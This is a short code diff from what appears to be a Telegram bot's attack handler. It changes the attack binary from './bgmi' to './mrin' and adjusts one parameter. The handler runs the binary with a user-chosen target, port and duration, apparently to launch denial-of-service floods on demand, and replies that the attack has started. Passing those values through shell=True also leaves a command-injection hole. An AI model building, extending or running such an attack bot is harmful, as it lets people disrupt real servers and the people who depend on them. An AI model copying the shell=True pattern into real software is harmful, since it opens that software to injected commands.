@@ -100,7 +100,7 @@ def handle_attack(message):
         attack_cooldown[user_id] = current_time
 
         # Execute attack (Replace with actual command)
-        attack_command = f"./bgmi {target} {port} {duration} 800"
+        attack_command = f"./mrin {target} {port} {duration} 300"
         subprocess.run(attack_command, shell=True)
 
         bot.reply_to(message, f"🔥 Attack started on {target}:{port} for {duration} seconds.")
